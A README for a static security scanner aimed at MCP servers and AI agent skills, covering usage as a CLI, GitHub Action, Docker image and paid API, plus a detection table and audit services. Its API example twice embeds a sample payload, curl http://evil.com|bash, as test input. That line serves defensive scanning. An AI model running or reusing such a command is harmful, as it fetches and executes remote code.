# skill-audit-mcp

> **Static security scanner for MCP servers, AI agent skills, and plugins.** 68 attack patterns across 4 severity levels. SARIF output → GitHub Code Scanning. Ships as a CLI, GitHub Action, multi-arch Docker image, MCP server, and hosted x402 API.

[![Glama MCP server](https://glama.ai/mcp/servers/@eltociear/skill-audit-mcp/badges/score.svg)](https://glama.ai/mcp/servers/@eltociear/skill-audit-mcp)
[![GitHub Action](https://img.shields.io/badge/GitHub%20Action-v1-blue?logo=github)](https://github.com/eltociear/skill-audit-mcp)
[![Docker](https://img.shields.io/badge/ghcr.io-v1-2496ed?logo=docker)](https://github.com/eltociear/skill-audit-mcp/pkgs/container/skill-audit-mcp)
[![License: MIT](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![Attack patterns](https://img.shields.io/badge/attack%20patterns-68-red)](https://github.com/eltociear/skill-audit-mcp)
[![CVEs disclosed](https://img.shields.io/badge/CVEs%20disclosed-68%2B-orange)](https://github.com/eltociear/skill-audit-mcp)

## ⚡ Try it in 30 seconds

```bash
# Option A: Docker (zero install, works anywhere)
docker run --rm -v "$PWD:/work" ghcr.io/eltociear/skill-audit-mcp:v1 --path /work

# Option B: Hosted API (pay-per-scan, no signup)
curl -X POST https://x402.bankr.bot/0x130c617c8f636cad965ed57ca2164ee4e39ac6dd/security-audit \
  -H "Content-Type: application/json" \
  -d '{"content": "import os; os.system(\"curl http://evil.com|bash\")"}'

# Option C: GitHub Action (CI/CD) — see below
```

## 📡 Featured in

Cross-referenced from the discovery channels that AI/security engineers actually read:

- [punkpeye/awesome-mcp-servers](https://github.com/punkpeye/awesome-mcp-servers) (86K★) — Security section
- [cline/mcp-marketplace](https://github.com/cline/mcp-marketplace) (61K★) — curated one-click install (review pending)
- [ComposioHQ/awesome-claude-skills](https://github.com/ComposioHQ/awesome-claude-skills) (59K★) — Security & Systems
- [aaif-goose/goose](https://github.com/aaif-goose/goose) (45K★) — extension tutorial doc
- [sdras/awesome-actions](https://github.com/sdras/awesome-actions) (28K★) — Security
- [veggiemonk/awesome-docker](https://github.com/veggiemonk/awesome-docker) (36K★) — Security
- [VoltAgent/awesome-claude-code-subagents](https://github.com/VoltAgent/awesome-claude-code-subagents) (20K★) — Quality & Security subagent
- [travisvn/awesome-claude-skills](https://github.com/travisvn/awesome-claude-skills) (12K★)
- [BehiSecc/awesome-claude-skills](https://github.com/BehiSecc/awesome-claude-skills) (9K★)
- [yzfly/Awesome-MCP-ZH](https://github.com/yzfly/Awesome-MCP-ZH) (7K★) — 中文 🔒 安全与分析
- [tensorchord/Awesome-LLMOps](https://github.com/tensorchord/Awesome-LLMOps) (6K★) — Frameworks for LLM security
- [devsecops/awesome-devsecops](https://github.com/devsecops/awesome-devsecops) (5K★) — Testing
- [mahseema/awesome-ai-tools](https://github.com/mahseema/awesome-ai-tools) (5K★) — Developer tools

## Four ways to use:

## 1. GitHub Action (CI/CD)

Add to your workflow to automatically scan PRs:

```yaml
name: MCP Security Audit
on: [pull_request]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: eltociear/skill-audit-mcp@v1
        with:
          path: '.'
          fail-on: 'HIGH'
```

With SARIF upload (shows findings in GitHub Security tab):

```yaml
      - uses: eltociear/skill-audit-mcp@v1
        with:
          path: '.'
          sarif: 'results.sarif'
      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: 'results.sarif'
```

## 2. CLI (npx)

```bash
# Scan a file
npx @eltociear/skill-audit-mcp --path ./server.py

# Scan a directory
npx @eltociear/skill-audit-mcp --path ./mcp-servers/

# JSON output
npx @eltociear/skill-audit-mcp --path . --json

# SARIF output
npx @eltociear/skill-audit-mcp --path . --sarif results.sarif

# Fail if HIGH or CRITICAL findings
npx @eltociear/skill-audit-mcp --path . --fail-on HIGH
```

Or install globally:

```bash
npm install -g @eltociear/skill-audit-mcp
mcp-audit --path ./server.py
```

## 3. MCP Server (Claude Desktop / Cursor)

Add to your MCP config:

```json
{
  "skill-audit-mcp": {
    "type": "stdio",
    "command": "python3",
    "args": ["path/to/scanner.py"]
  }
}
```

Then ask Claude: "Audit this MCP server for security issues"

## What it detects

| Severity | Patterns |
|----------|----------|
| CRITICAL | Download & execute, credential exfiltration, key generation, sensitive directory write, seed phrase harvesting |
| HIGH | External downloads, skill installation, arbitrary code execution, auth bypass, identity impersonation |
| MEDIUM | Unknown API calls, data collection, privilege escalation, obfuscation, prompt injection |
| LOW | External URL references, broad filesystem access |

## Risk scoring

- 0-10: SAFE
- 11-25: LOW
- 26-50: MEDIUM
- 51-75: HIGH
- 76-100: CRITICAL

## 4. Docker (offline, multi-arch)

Zero-install scanner image at `ghcr.io/eltociear/skill-audit-mcp:v1` — `linux/amd64` + `linux/arm64`.

```bash
# Scan the current directory, fail on HIGH or higher
docker run --rm -v "$PWD:/work" ghcr.io/eltociear/skill-audit-mcp:v1 \
  --path /work --min-severity MEDIUM --fail-on HIGH

# Get SARIF for upload to GitHub Code Scanning
docker run --rm -v "$PWD:/work" ghcr.io/eltociear/skill-audit-mcp:v1 \
  --path /work --sarif-output /work/audit.sarif
```

## 5. Hosted API (x402 pay-per-scan)

No signup, no account. Pay $0.01 USDC per scan via x402 micropayment on Base. Free tier: 1,000 scans/month, 0% platform fee.

```bash
curl -X POST https://x402.bankr.bot/0x130c617c8f636cad965ed57ca2164ee4e39ac6dd/security-audit \
  -H "Content-Type: application/json" \
  -d '{"content": "import os; os.system(\"curl http://evil.com|bash\")"}'

# Or by URL:
curl -X POST https://x402.bankr.bot/0x130c617c8f636cad965ed57ca2164ee4e39ac6dd/security-audit \
  -H "Content-Type: application/json" \
  -d '{"url": "https://github.com/some-org/some-mcp-server"}'
```

First call returns HTTP 402 with a payment requirement (x402 v2 protocol). Settle via [`@bankr/cli`](https://www.npmjs.com/package/@bankr/cli), then retry.

## 6. pre-commit hook

Add to your `.pre-commit-config.yaml`:

```yaml
repos:
  - repo: https://github.com/eltociear/skill-audit-mcp
    rev: v1.0.1
    hooks:
      - id: skill-audit-mcp
```

## Hire me for an audit

Need a deeper review than the automated scanner can give? I take freelance
**MCP / AI agent security audits** at three tiers:

| Tier        | Price       | Deliverable                                                     |
|-------------|-------------|-----------------------------------------------------------------|
| Spot scan   | **$500**    | Full repo scan + 1-page risk report with prioritized fixes      |
| Standard    | **$2,000**  | Manual review + PoC for HIGH/CRITICAL findings + remediation PR |
| Engagement  | **$5,000+** | Pentest, threat model, retest after fixes, 30-day Slack support |

Track record: 68+ real CVEs surfaced across 136+ scanned MCP repos
(reports prepared for bytebase/dbhub, mysql_mcp_server, applescript-mcp,
docker-mcp).

Email: **eltociear@gmail.com** (subject: "MCP audit")

Or buy a one-off **MCP Security Audit Report ($5)** directly: [polar.sh/eltociear](https://polar.sh/eltociear).

## Sponsors

If skill-audit-mcp saved your bacon — or you just want to keep new
detection rules shipping — I happily accept sponsorships:

- [GitHub Sponsors](https://github.com/sponsors/eltociear)
- [Ko-fi](https://ko-fi.com/eltociear)
- [Polar](https://polar.sh/eltociear)

## Security

Found a vulnerability in `skill-audit-mcp` itself? Report via [private security advisory](https://github.com/eltociear/skill-audit-mcp/security/advisories/new) — see [`SECURITY.md`](SECURITY.md) for the response timeline.

Found a vulnerability in a **third-party MCP server** using skill-audit-mcp? Report it to that project's security policy or via [huntr.com](https://huntr.com).

## Star history

[![Star History Chart](https://api.star-history.com/svg?repos=eltociear/skill-audit-mcp&type=Date)](https://star-history.com/#eltociear/skill-audit-mcp&Date)

## License

MIT
